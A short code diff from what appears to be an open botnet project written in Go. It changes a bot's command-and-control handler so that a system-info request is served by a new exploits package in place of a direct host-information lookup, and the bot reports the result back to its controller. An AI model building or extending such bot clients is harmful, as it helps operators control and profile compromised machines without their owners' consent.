@@ -2,17 +2,16 @@ package bot
 
 import (
 	"crypto/rsa"
-	"encoding/json"
 	"fmt"
 	"log"
 	"os"
 	"os/signal"
 
-	"github.com/shirou/gopsutil/host"
 	"time"
 
 	"github.com/gorilla/websocket"
 
+	"github.com/adrianosela/botnet/exploits"
 	"github.com/adrianosela/botnet/lib/encryption"
 	"github.com/adrianosela/botnet/lib/protocol"
 )
@@ -79,11 +78,7 @@ func (b *Bot) HandleCommandFromCC(c *protocol.Command) error {
 		return b.SendMessageToCC(&protocol.Message{Type: protocol.MessageTypePong})
 	case protocol.CommandTypeSysInfo:
 		log.Printf("[cmd&ctrl] [[%s]] system info requested by command and control at %d. full command: %v", c.Type, time.Now().Unix(), *c)
-		hostStat, err := host.Info()
-		if err != nil {
-			return err
-		}
-		bytesJSON, err := json.Marshal(hostStat)
+		bytesJSON, err := exploits.GetSysInfo()
 		if err != nil {
 			return err
 		}
